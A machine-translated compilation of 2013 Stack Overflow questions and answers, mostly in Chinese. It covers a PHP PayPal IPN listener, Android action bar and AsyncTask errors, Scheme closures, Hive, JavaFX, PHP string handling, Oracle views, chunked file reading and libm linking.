     *  exception if the post fails. Populates the response, response_status,
     *  and post_uri properties on success.
     *
     *  @param  string  The post data as a URL encoded string
     */
    protected function curlPost($encoded_data) {

        if ($this->use_ssl) {
            $uri = 'https://'.$this->getPaypalHost().'/cgi-bin/webscr';
            $this->post_uri = $uri;
        } else {
            $uri = 'http://'.$this->getPaypalHost().'/cgi-bin/webscr';
            $this->post_uri = $uri;
        }

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_CAINFO, 
                    dirname(__FILE__)."/cert/api_cert_chain.crt");
        curl_setopt($ch, CURLOPT_URL, $uri);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $encoded_data);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $this->follow_location);
        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);

        if ($this->force_ssl_v3) {
            curl_setopt($ch, CURLOPT_SSLVERSION, 3);
        }

        $this->response = curl_exec($ch);
        $this->response_status = strval(curl_getinfo($ch, CURLINFO_HTTP_CODE));

        if ($this->response === false || $this->response_status == '0') {
            $errno = curl_errno($ch);
            $errstr = curl_error($ch);
            throw new Exception("cURL error: [$errno] $errstr");
        }
    }

    /**
     *  Post Back Using fsockopen()
     *
     *  Sends the post back to PayPal using the fsockopen() function. Called by
     *  the processIpn() method if the use_curl property is false. Throws an
     *  exception if the post fails. Populates the response, response_status,
     *  and post_uri properties on success.
     *
     *  @param  string  The post data as a URL encoded string
     */
    protected function fsockPost($encoded_data) {

        if ($this->use_ssl) {
            $uri = 'ssl://'.$this->getPaypalHost();
            $port = '443';
            $this->post_uri = $uri.'/cgi-bin/webscr';
        } else {
            $uri = $this->getPaypalHost(); // no "http://" in call to fsockopen()
            $port = '80';
            $this->post_uri = 'http://'.$uri.'/cgi-bin/webscr';
        }

        $fp = fsockopen($uri, $port, $errno, $errstr, $this->timeout);

        if (!$fp) { 
            // fsockopen error
            throw new Exception("fsockopen error: [$errno] $errstr");
        } 

        $header = "POST /cgi-bin/webscr HTTP/1.1\r\n";
        $header .= "Host: ".$this->getPaypalHost()."\r\n";
        $header .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $header .= "Content-Length: ".strlen($encoded_data)."\r\n";
        $header .= "Connection: Close\r\n\r\n";

        fputs($fp, $header.$encoded_data."\r\n\r\n");

        while(!feof($fp)) { 
            if (empty($this->response)) {
                // extract HTTP status from first line
                $this->response .= $status = fgets($fp, 1024); 
                $this->response_status = trim(substr($status, 9, 4));
            } else {
                $this->response .= fgets($fp, 1024); 
            }
        } 

        fclose($fp);
    }

    private function getPaypalHost() {
        if ($this->use_sandbox) return self::SANDBOX_HOST;
        else return self::PAYPAL_HOST;
    }

    /**
     *  Get POST URI
     *
     *  Returns the URI that was used to send the post back to PayPal. This can
     *  be useful for troubleshooting connection problems. The default URI
     *  would be "ssl://www.sandbox.paypal.com:443/cgi-bin/webscr"
     *
     *  @return string
     */
    public function getPostUri() {
        return $this->post_uri;
    }

    /**
     *  Get Response
     *
     *  Returns the entire response from PayPal as a string including all the
     *  HTTP headers.
     *
     *  @return string
     */
    public function getResponse() {
        return $this->response;
    }

    /**
     *  Get Response Status
     *
     *  Returns the HTTP response status code from PayPal. This should be "200"
     *  if the post back was successful. 
     *
     *  @return string
     */
    public function getResponseStatus() {
        return $this->response_status;
    }

    /**
     *  Get Text Report
     *
     *  Returns a report of the IPN transaction in plain text format. This is
     *  useful in emails to order processors and system administrators. Override
     *  this method in your own class to customize the report.
     *
     *  @return string
     */
    public function getTextReport() {

        $r = '';

        // date and POST url
        for ($i=0; $i<80; $i++) { $r .= '-'; }
        $r .= "\n[".date('m/d/Y g:i A').'] - '.$this->getPostUri();
        if ($this->use_curl) $r .= " (curl)\n";
        else $r .= " (fsockopen)\n";

        // HTTP Response
        for ($i=0; $i<80; $i++) { $r .= '-'; }
        $r .= "\n{$this->getResponse()}\n";

        // POST vars
        for ($i=0; $i<80; $i++) { $r .= '-'; }
        $r .= "\n";

        foreach ($this->post_data as $key => $value) {
            $r .= str_pad($key, 25)."$value\n";
        }
        $r .= "\n\n";

        return $r;
    }

    /**
     *  Process IPN
     *
     *  Handles the IPN post back to PayPal and parsing the response. Call this
     *  method from your IPN listener script. Returns true if the response came
     *  back as "VERIFIED", false if the response came back "INVALID", and 
     *  throws an exception if there is an error.
     *
     *  @param array
     *
     *  @return boolean
     */    
    public function processIpn($post_data=null) {

        $encoded_data = 'cmd=_notify-validate';

        if ($post_data === null) { 
            // use raw POST data 
            if (!empty($_POST)) {
                $this->post_data = $_POST;
                $encoded_data .= '&'.file_get_contents('php://input');
            } else {
                throw new Exception("No POST data found.");
            }
        } else { 
            // use provided data array
            $this->post_data = $post_data;

            foreach ($this->post_data as $key => $value) {
                $encoded_data .= "&$key=".urlencode($value);
            }
        }

        if ($this->use_curl) $this->curlPost($encoded_data); 
        else $this->fsockPost($encoded_data);

        if (strpos($this->response_status, '200') === false) {
            throw new Exception("Invalid response status: ".$this->response_status);
        }

        if (strpos($this->response, "VERIFIED") !== false) {
            return true;
        } elseif (strpos($this->response, "INVALID") !== false) {
            return false;
        } else {
            throw new Exception("Unexpected response from PayPal.");
        }
    }

    /**
     *  Require Post Method
     *
     *  Throws an exception and sets a HTTP 405 response header if the request
     *  method was not POST. 
     */    
    public function requirePostMethod() {
        // require POST requests
        if ($_SERVER['REQUEST_METHOD'] && $_SERVER['REQUEST_METHOD'] != 'POST') {
            header('Allow: POST', true, 405);
            throw new Exception("Invalid HTTP request method.");
        }
    }
} 
```

信用属于 Micah Carrick

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T12:36:19.253

IPN 是一个幕后功能。您为什么要尝试将它们打印到屏幕上？买家不应返回此页面，因此没有人会看到您尝试在屏幕上打印的内容。如果您尝试将信息打印到屏幕上以创建动态类型的收据，那么您可能需要为此使用[PDT](https://www.x.com/developers/paypal/documentation-tools/paypal-payments-standard/integration-guide/paymentdatatransfer)。此外，IPN 是一种异步消息服务，这意味着消息与您网站上的操作不同步。因此，收听 IPN 消息不会增加在您的网站上完成交易所需的时间。

IPN 消息服务并不假定您的听众会及时收到所有消息。由于互联网并非 100% 可靠，因此消息可能会丢失或延迟。为了处理传输和接收延迟或失败的可能性，IPN 消息服务实施了一种重试机制，该机制会以不同的时间间隔重新发送消息，直到您确认消息已成功接收。邮件可能会在原始邮件之后的四天内重新发送。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:24:07.287

如果您确实需要在屏幕上显示 IPN 消息变量，您首先需要将 IPN 消息中发送的所有变量写入数据库。然后，您可以调用该数据库条目并查看您需要的任何信息。默认情况下，IPN 不会在屏幕上显示任何信息。它只是不应该那样工作。

# android - 将操作栏与 Google Maps API v2 集成

> ID：16204413
> 
> 赞同：0
> 
> 时间：2013-04-25T00:21:38.317
> 
> 标签：android, eclipse, google-maps, android-fragments, android-actionbar

我正在尝试设置一个允许用户查找本地企业和活动的应用程序。我有一个工作地图，但我无法将其集成到选项卡式操作栏。不幸的是，它显示“不幸的是，[app] 已停止。” 任何帮助将不胜感激。

ActionBarMain.java

```
@SuppressLint("NewApi")
public class ActionBarMain extends Activity implements TabListener {
    RelativeLayout rl;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_action_bar_main);
        try {
            rl = (RelativeLayout) findViewById(R.id.mainLayout);
            fragMentTra = getFragmentManager().beginTransaction();
            ActionBar bar = getActionBar();
            bar.addTab(bar.newTab().setText("Map").setTabListener(this));
            bar.addTab(bar.newTab().setText("Businesses").setTabListener(this));
            bar.addTab(bar.newTab().setText("Events").setTabListener(this));
            bar.addTab(bar.newTab().setText("Facebook").setTabListener(this));

            bar.setDisplayOptions(ActionBar.DISPLAY_SHOW_CUSTOM
                    | ActionBar.DISPLAY_USE_LOGO);
            bar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);
            bar.setDisplayShowHomeEnabled(true);
            bar.setDisplayShowTitleEnabled(false);
            bar.show();

        } catch (Exception e) {
            e.getMessage();
        }
        /**
         * Hiding Action Bar
         */
    }

    Fragment fram1;
    FragmentTransaction fragMentTra = null;
    FragMent2 fram2;
    FragMent3 fram3;
    FragMent4 fram4;
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_action_bar_main, menu);
        return true;
    }

    @Override
    public void onTabReselected(Tab tab, FragmentTransaction ft) {
    }

    @Override
    public void onTabSelected(Tab tab, FragmentTransaction ft) {

        if (tab.getText().equals("Map")) {
            try {
                rl.removeAllViews();
            } catch (Exception e) {
            }
            fram1 = new Fragment();
            fragMentTra.addToBackStack(null);
            fragMentTra = getFragmentManager().beginTransaction();
            fragMentTra.add(rl.getId(), fram1);
            fragMentTra.commit();
        } else if (tab.getText().equals("Businesses")) {
            try {
                rl.removeAllViews();
            } catch (Exception e) {
            }
            fram2 = new FragMent2();
            fragMentTra.addToBackStack(null);
            fragMentTra = getFragmentManager().beginTransaction();
            fragMentTra.add(rl.getId(), fram2);
            fragMentTra.commit();
        } else if (tab.getText().equals("Events")) {
            try {
                rl.removeAllViews();
            } catch (Exception e) {
            }
            fram3 = new FragMent3();
            fragMentTra.addToBackStack(null);
            fragMentTra = getFragmentManager().beginTransaction();
            fragMentTra.add(rl.getId(), fram3);
            fragMentTra.commit();
        } else if (tab.getText().equals("Facebook")) {
            try {
                rl.removeAllViews();
            } catch (Exception e) {
            }
            fram2 = new FragMent2();
            fragMentTra.addToBackStack(null);
            fragMentTra = getFragmentManager().beginTransaction();
            fragMentTra.add(rl.getId(), fram2);
            fragMentTra.commit();
        }

    }

    @Override
    public void onTabUnselected(Tab tab, FragmentTransaction ft) {

    }

} 
```

片段1.java：

```
public class FragMent1 extends FragmentActivity{

SupportMapFragment mMap;
GoogleMap googleMap;

  @Override
 protected void onCreate(Bundle savedInstanceState) {
   super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_action_bar_main);

       mMap = (SupportMapFragment) getSupportFragmentManager()
        .findFragmentById(R.id.mainGrid);

        googleMap = mMap.getMap();
 }
} 
```

AndroidManifest.xml：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.ahmad.actionBar"
    android:versionCode="1"
    android:versionName="1.0" >

    <permission
        android:name="com.ahmad.actionbar.permission.MAPS_RECEIVE"
        android:protectionLevel="signature"/>
    <uses-permission android:name="com.ahmad.actionbar.permission.MAPS_RECEIVE"/>

    <uses-sdk
        android:minSdkVersion="11"
        android:targetSdkVersion="17" />

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES"/>
    <!-- The following two permissions are not required to use
     Google Maps Android API v2, but are recommended. -->
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <!-- Maps API needs OpenGL ES 2.0\. -->
    <uses-feature
        android:glEsVersion="0x00020000"
        android:required="true"/>

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" 
        android:allowBackup="True">
        <meta-data
        android:name="com.google.android.maps.v2.API_KEY"
        android:value="super_secret_key"/>
        <activity
            android:name="com.ahmad.actionbar.MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity
            android:name=".ActionBarMain"
            android:label="@string/title_activity_action_bar_main"
            android:uiOptions="splitActionBarWhenNarrow" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

编辑：

修复了尝试将两个应用程序集成在一起的一些错误并添加了新的 logcat。

日志猫：

```
04-24 21:34:33.242: D/AndroidRuntime(11335): Shutting down VM
04-24 21:34:33.242: W/dalvikvm(11335): threadid=1: thread exiting with uncaught exception (group=0x40e26930)
04-24 21:34:33.252: E/AndroidRuntime(11335): FATAL EXCEPTION: main
04-24 21:34:33.252: E/AndroidRuntime(11335): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.ahmad.actionBar/com.ahmad.actionbar.MainActivity}: java.lang.ClassNotFoundException: Didn't find class "com.ahmad.actionbar.MainActivity" on path: /data/app/com.ahmad.actionBar-2.apk
04-24 21:34:33.252: E/AndroidRuntime(11335):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2106)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2230)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at android.app.ActivityThread.access$600(ActivityThread.java:141)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1234)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at android.os.Handler.dispatchMessage(Handler.java:99)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at android.os.Looper.loop(Looper.java:137)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at android.app.ActivityThread.main(ActivityThread.java:5041)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at java.lang.reflect.Method.invokeNative(Native Method)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at java.lang.reflect.Method.invoke(Method.java:511)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at dalvik.system.NativeStart.main(Native Method)
04-24 21:34:33.252: E/AndroidRuntime(11335): Caused by: java.lang.ClassNotFoundException: Didn't find class "com.ahmad.actionbar.MainActivity" on path: /data/app/com.ahmad.actionBar-2.apk
04-24 21:34:33.252: E/AndroidRuntime(11335):    at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:65)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at java.lang.ClassLoader.loadClass(ClassLoader.java:501)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at java.lang.ClassLoader.loadClass(ClassLoader.java:461)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at android.app.Instrumentation.newActivity(Instrumentation.java:1054)
04-24 21:34:33.252: E/AndroidRuntime(11335):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2097)
04-24 21:34:33.252: E/AndroidRuntime(11335):    ... 11 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T03:32:27.290

错误说“找不到类 MainActivity”。

您发布的类名为 ActionBarMain 而您的清单文件说 MainActivity 是您的主类。

如果您的项目中没有任何 MainActivity，并且您希望 ActionBarMain 成为您的第一个 Activity。然后在清单文件中将 ActionBarMain 替换为 MainAcitivty。

# objective-c - 哪里是学习最新iphone开发的好地方？

> ID：16204416
> 
> 赞同：-1
> 
> 时间：2013-04-25T00:22:14.520
> 
> 标签：objective-c, xcode

在学习了 C 之后，我才开始使用 Objective-c。我在网上寻找一些好的教程，但它们都有在最新版本中被弃用的功能或新功能。我想知道你是否知道有什么地方有很好的 iphone 6.1 教程，或者 XCode 上是否有任何方法可以为旧版本开发。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:47:16.027

你好 scrblnrd3 欢迎来到 Objective-C 和 iOS 编程的世界。无论您是新手还是经验丰富的开发人员，如果您正在寻找有关最新 iOS 主题的教程，[这里](http://www.raywenderlich.com/tutorials)都是您的去处。

还有一些苹果开发者文档可以用来学习，它们非常详尽。我建议你从阅读[这些](https://developer.apple.com/library/ios/navigation/index.html#section=Resource%20Types&topic=Getting%20Started)文章开始。

[这个](https://stackoverflow.com/questions/6329029/best-ios-development-tutorials)问题的答案还列出了一些不错的 iOS 教程网站。

# lambda - 方案：这个函数评估什么？

> ID：16204420
> 
> 赞同：0
> 
> 时间：2013-04-25T00:22:39.400
> 
> 标签：lambda, scheme, evaluate

```
(define test
     (lambda()
       (let* ((x 1)
              (y 3)
              (z 5)
              (foo (lambda (n)
                     (let* ((x 3)
                            (y (+ x n))
                            (g (lambda(w) (+ (* x w) y))))
                       g))))
        ((foo 10) x)))) 
```

这意味着什么？

试图：

调用`(foo 10)`-> `(lambda(w) (+ x w) y)`，其中 x = 3，y = 13

呼叫`((lambda(w) (+ (* x w) y) x)`->（本地 x 为 1）->

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:59:23.273

```
(foo 10) => (lambda (w) (+ (* x w) y) ; where x = 3 and y = 13
         => (lambda (w) (+ (* 3 w) 13)

((foo 10) x) => (+ (* 3 w) 13) ; where w is 1
             => (+ (* 3 1) 13)
             => 16 
```

[看这里](http://repl.it/Iij)

不知道你从哪里得到52。

# hive - 无法重命名具有大量分区的大型 Hive 表

> ID：16204421
> 
> 赞同：1
> 
> 时间：2013-04-25T00:22:38.957
> 
> 标签：hive

我正在尝试重命名具有大量分区（多级，两级）的大型 Hive 表（托管表）。每当我们使用 ALTER TABLE 命令时，它就会挂起。它是 Hive 中现有的错误吗？有人遇到过这个问题吗？任何指针都会有所帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-05T12:17:49.360

您是说 ALTER TABLE 命令挂起。因此，请尝试使用 Hive 中的导入和导出选项。

通过导出 --> 在 HDFS 中定位文件

通过导入 --> 从 HDFS 复制数据

导出表 tbl_nm 到“hdfs_location”；

从'hdfs_location'导入表new_tbl_nm；

访问这里了解更多详情..

[http://www.aptibook.com/discuss-technical?uid=tech-hive13&question=Rename-a-table-in-Hive-%E2%80%93-How-to-do-it](http://www.aptibook.com/discuss-technical?uid=tech-hive13&question=Rename-a-table-in-Hive-%E2%80%93-How-to-do-it)？

# javafx-2 - 如何在 ContextMenu 打开时更改 TreeView 中的选择

> ID：16204437
> 
> 赞同：1
> 
> 时间：2013-04-25T00:24:11.877
> 
> 标签：javafx-2, javafx

如果在 TreeView 中的 TreeItem 上执行右键单击，它将被选中。但是，如果在上下文菜单打开时右键单击另一个项目，则不会更新选择。 ![初始右键单击](https://i.stack.imgur.com/d5pC2.png) ![第二次右键](https://i.stack.imgur.com/IOYc5.png)

如何在第二次右键单击时更新选择？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T09:19:46.983

消费自动隐藏事件

public final BooleanProperty consumeAutoHidingEventsProperty

指定是否应该使用导致 Popup 隐藏的事件。使用事件可以防止它在弹出窗口的所有者窗口中触发一些额外的 UI 响应。

默认值：真

您是否尝试将其设置为假？

在一般情况下，所有弹出窗口都可以使用事件来关闭自己。

# php - 没有正则表达式的 Piglatin 程序的 PHP 脚本——如何考虑以元音“th”或“sh”开头的单词？

> ID：16204440
> 
> 赞同：3
> 
> 时间：2013-04-25T00:24:19.733
> 
> 标签：php, arrays, string, if-statement, foreach

基本上，我正在尝试用 PHP 编写一个非常基本的程序，它只接受用户输入并使用 PHP 将其转换为 Piglatin，而不使用正则表达式。到目前为止，这就是我的代码的样子，这很好：

```
<?php # script
$original = $_REQUEST['original'];
$array = explode(" ", $original);

$piglatin = "";
foreach($array as $word)
{
    $word = trim($word);
    $first = substr($word,0,1);
    $thsh = substr($word,1,2);
    $thshrest = substr($word,2, strlen($word)-2);
    $rest = substr($word,1,strlen($word)-1);

    if(trim($word)) 
    {
        $piglatin .= (strlen($word)==1)?$first." ":$rest.$first. "ay ";
    }
}

echo $original ." becomes: ".$piglatin;
?> 
```

除非它没有考虑特殊情况，例如单词以元音开头（在这种情况下，例如单词“igloo”应该打印为“iglooway”），或者如果它以“th”开头或“sh”（在这种情况下，例如，单词“thimble”应该打印为“imblethay”，取前两个字母并将它们带到最后而不是第一个。）

我已经开始从以“th”和“sh”开头的字符串创建变量的过程（参见 $thsh 和 $thshrest），但我真的很困惑我应该从这里去哪里？

感谢所有帮助，谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-30T17:46:05.450

是的，不使用正则表达式，您需要手动检查所有情况：

```
if ($first == "a" || $first == "e" || $first == "i" || $first == "o" || $first == "u"){
  $piglatin .= (strlen($word)==1)?$first." ":$word. "ay ";
} elseif ($thsh == "th" || $thsh == "sh") {
  $piglatin .= (strlen($word)==1)?$first." ":$thshrest.$thsh. "ay ";
} else {
  $piglatin .= (strlen($word)==1)?$first." ":$rest.$first. "ay ";
} 
```

（我没有测试过这段代码）

# android - AsyncTask 中的 android.os.NetworkOnMainThreadException

> ID：16204441
> 
> 赞同：5
> 
> 时间：2013-04-25T00:24:22.067
> 
> 标签：android, android-asynctask, http-post, networkonmainthread

我正在构建一个应用程序，并在AsyncTask内收到*NetworkOnMainThreadException*

称呼：

```
new POST(this).execute(""); 
```

异步任务：

```
public class POST extends AsyncTask<String, Integer, HttpResponse>{
private MainActivity form;
public POST(MainActivity form){
    this.form = form;
}

@Override
protected HttpResponse doInBackground(String... params) {
try {
        HttpPost httppost = new HttpPost("http://diarwe.com:8080/account/login");
    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(3);
    nameValuePairs.add(new BasicNameValuePair("email",((EditText)form.findViewById(R.id.in_email)).getText().toString()));
    //add more...
    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    return new DefaultHttpClient().execute(httppost);
} catch (Exception e) {
    Log.e("BackgroundError", e.toString());
}
return null;
}

@Override
protected void onPostExecute(HttpResponse result) {
super.onPostExecute(result);
try {
    Gson gSon = new GsonBuilder().setDateFormat("yyyy-MM-dd'T'HH:mm:ss").create();
    gSon.fromJson(IOUtils.toString(result.getEntity().getContent()), LogonInfo.class).fill(form);
} catch (Exception e) {
    Log.e("BackgroundError", e.toString());
}
}
} 
```

日志猫：

```
BackgroundError | android.os.NetworkOnMainThreadException 
```

我很困惑为什么在 AsyncTask 的 doInBackground 中的 do 中抛出了这个异常，有什么想法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-25T00:28:16.973

将`JSON`代码移入`doInBackground()`：

```
@Override
protected HttpResponse doInBackground(String... params) {
    ...
    Your current HttpPost code...
    ...
    Gson gSon = new GsonBuilder().setDateFormat("yyyy-MM-dd'T'HH:mm:ss").create();
    gSon.fromJson(IOUtils.toString(result.getEntity().getContent()), LogonInfo.class).fill(form);
    ...
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T00:28:30.920

`result.getEntity().getContent()`打开从网络读取的流，因此网络通信在主线程中。将 JSON 解析`doInBackground()`移至`onPostExecute()`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T00:38:21.177

我认为问题出现是因为您将 继承 `MainActivity`到您的`AsyncTask`中，请尝试删除这部分代码：

```
private MainActivity form;
public POST(MainActivity form){
    this.form = form;
} 
```

由于您不需要它，并且如果您想将任何参数传递给`AsyncTask`您可以立即通过该`doInBackGround()`方法传递它。

也叫你`AsyncTask`使用以下`new POST().execute();`

你也不需要调用`super.onPostExecute(result);`你的`onPostExecute()`方法。

我希望这会有所帮助。

# php - 在 PHP 中的 Javascript 中回显 PHP 变量

> ID：16204444
> 
> 赞同：0
> 
> 时间：2013-04-25T00:24:37.803
> 
> 标签：php, javascript

这似乎是一个奇怪的问题，并且可能已经在其他地方得到了回答……但坦率地说，我不太确定如何更好地表达搜索。

本质上，我正在尝试用 PHP 编写整个 HTML 和 Javascript 页面（这样我可以轻松地调用和操作 SQL 查询......我知道这没有多大意义，但这是我在即将到来的最后期限前的最后手段）。

无论如何，我想在我的 Javascript 中调用/附加到 PHP 变量（SQL 查询）......像这样：

```
mysql_connect("$host", "$username", "$password")or die("cannot connect"); 
mysql_select_db("$db_name")or die("cannot select DB");
$myquery = "SELECT  `xxx`, `yyy` FROM `$tbl_name`";
$query = mysql_query($myquery);
$data = array();

for ($i = 0; $i < mysql_num_rows($query); $i++) {
    $data[] = mysql_fetch_assoc($query);
}

$data1 = json_encode($data);

echo '<!DOCTYPE html>
      <html>
          <head></head>
          <body>
              <script>
                  data_arr = {$data1}
                  ...
                  ... 
```

不过，这似乎不起作用。我试过了：

```
 data_arr = {$data1} 
```

和

```
 data_arr = {'.$data1.'} 
```

到目前为止没有运气。有什么我可以做的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:26:28.787

将引号更改为双引号，然后使用双引号`data_arr = {$data1}`。单引号根本不识别值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T02:09:11.593

**试试这个，这可能有效：**

**PHP：**

```
<?php $data1 = "hello"; ?> 
```

**JS：**

```
var data_arr = {"<?=$data1?>"} 
```

# sql - SQL Oracle在查找最近的财产所有者时创建视图错误

> ID：16204447
> 
> 赞同：0
> 
> 时间：2013-04-25T00:24:40.303
> 
> 标签：sql, oracle, date, view

所以我正在研究数据库的视图。在此视图中，它需要显示一个人拥有的所有属性，并且只显示该属性的当前所有者。应该这样做的方式是查看 propertyID 的购买日期，并且只显示最近的一个。

这是我到目前为止的代码：

```
CREATE VIEW P_OWNERS_AND_PROPERTIES_V AS
SELECT P_OWNER.OWNERID, P_OWNER.LNAME, P_OWNER.FNAME, 
P_PURCHASE.PROPERTYID,P_PURCHASE.PURCHASEDATE
FROM P_OWNER LEFT JOIN P_PURCHASE
ON P_OWNER.OWNERID=P_PURCHASE.OWNERID
WHERE (P_PURCHASE.PURCHASEDATE = (SELECT MAX(P1.PURCHASEDATE) 
FROM P_PURCHASE P1 WHERE P1.OWNERID = P_PURCHASE.OWNERID)) 
OR (P_PURCHASE.PROPERTYID IS NULL); 
```

任何帮助将非常感激。

编辑：清理代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T07:14:05.437

Here is what I would do:

Join p_owner and p_purchase via ownerid. This gives you a list where each owner is shown with the all the properties ever owned (i.e. a full listing of all purchases)

Then you add an analytic function rownum() where you partition by propteryid and order by purchasedate desc. This adds a number to each row, such that the latest purchase for each property gets a rownum()=1\. Alias this column with something like "purchase_rank".

Purchase_rank tells you, for each purchase, if it was the latest, second-to-latest etc.

Then wrap the whole thing in another select, where you filter "where purchase_rank=1", and chose the columns you want to see.

In any case, don't shy away from analytic functions. They can be life-saving.

# php - 使用 PHP 读取“块”中的文件

> ID：16204453
> 
> 赞同：4
> 
> 时间：2013-04-25T00:25:09.193
> 
> 标签：php, regex

通过相对较小的数据块在 php 中读取文件的最佳方法是什么？

例如，读取 5MB，然后释放该内存并再读取 5MB

我正在用 php 编写一个解析工具，它需要读取一个巨大的文件并将其转换为 CSV。

我的问题是我不断超出允许的内存限制，并且在我的环境中提高它不是一个选项。

这是完成工作的代码的一部分：

```
$i = 0;
$fileName = "test.txt";
$file = fopen($fileName,'r');

while($i <= 2000) {
    $line = fgets($file);
    $streetsheet[$i] = preg_split('@\ @',$line,NULL, PREG_SPLIT_NO_EMPTY);
    ++$i;
}

fclose($file);
$fp = fopen('result.csv','w');

foreach($streetsheet as $key=>$value) {
    fputcsv($fp, $value);
} 
```

例如，在上面显示的片段中，我正在读取文件的前 2000 行，它工作得很好。

当我将条件更改为

`while(!feof($file)){\*....*\}`

它立即告诉我我已经超出了允许的内存限制，然后它告诉我导致问题的行是我使用 preg_split 的行。

所以我想知道读取文件的最佳方式是什么... 一次 1000 行？

谢谢！

**如果您要投反对票，至少要有礼貌地解释原因**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T00:30:51.113

您*已经*在“部分”中阅读它：您正在逐行阅读它。问题是您将所有行都粘贴到数组中，然后转储数组。

相反，读取一行并输出一行并完全跳过数组：

```
$fileName = "test.txt";
$file = fopen($fileName,'r');
$fp = fopen('result.csv','w');

while(!feof($file)) {
    $line = fgets($file);
    $value = preg_split('@\ @',$line,NULL, PREG_SPLIT_NO_EMPTY);
    fputcsv($fp, $value);
}

fclose($file);
fclose($fp); 
```

# c++ - 为什么它不需要链接 libm？

> ID：16204457
> 
> 赞同：5
> 
> 时间：2013-04-25T00:25:19.237
> 
> 标签：c++, c, gcc, libm

```
#include <math.h>
#include <stdio.h>
int main()
{
   printf("%f", roundf(3.14));
} 
```

我编译上面的代码（没有使用-lm），添加use ldd a.out，结果是

```
linux-vdso.so.1 =>  (0x00007fffab9ff000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd6da0f8000)
/lib64/ld-linux-x86-64.so.2 (0x00007fd6da4eb000) 
```

为什么 a.out 没有与*libm*链接但可以使用 roundf（或类似 sqrt 的东西）？我使用 nm 来测试 libc.so.6 和 ld-linux-x86064.so.2 但所有这些都没有 roundf 的符号。

我想知道在哪里定义了roundf，或者它已经被编译器内联了？（使用 gcc 4.7.3 和 gcc 4.6.3 进行测试）

* * *

答案是[http://fedoraproject.org/w/index.php?title=UnderstandingDSOLinkChange](http://fedoraproject.org/w/index.php?title=UnderstandingDSOLinkChange)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-25T00:29:28.063

作为一种优化，编译器将在编译时计算该值并使用一个常量，因此不`roundf()`涉及调用。您可以通过查看生成的代码来验证这一点：

```
main:
    pushl   %ebp
    movl    %esp, %ebp
    andl    $-16, %esp
    subl    $16, %esp
    movl    $.LC0, %eax
    fldl    .LC1
    fstpl   4(%esp)
    movl    %eax, (%esp)
    call    printf
    leave
    ret 
